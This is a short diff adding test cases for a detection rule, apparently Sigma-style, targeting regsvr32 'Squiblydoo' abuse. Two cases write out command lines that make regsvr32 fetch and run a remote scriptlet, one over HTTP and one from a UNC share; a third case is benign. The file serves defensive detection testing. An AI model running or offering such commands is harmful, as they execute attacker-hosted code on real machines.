@@ -1,0 +1,24 @@
+rule: rule.yml
+
+cases:
+  - name: squiblydoo remote scriptlet fires
+    event:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      CommandLine: 'regsvr32.exe /s /u /i:http://203.0.113.77/payload.sct scrobj.dll'
+    match: true
+    selections:
+      - selection_img
+      - selection_remote
+      - selection_scrobj
+
+  - name: regsvr32 unc scriptlet fires
+    event:
+      Image: 'C:\Windows\SysWOW64\regsvr32.exe'
+      CommandLine: 'regsvr32.exe /s /i:\\203.0.113.77\share\stage.sct scrobj.dll'
+    match: true
+
+  - name: regsvr32 registering a vendor dll is benign
+    event:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      CommandLine: 'regsvr32.exe /s "C:\Program Files\Vendor\App\shellext.dll"'
+    match: false
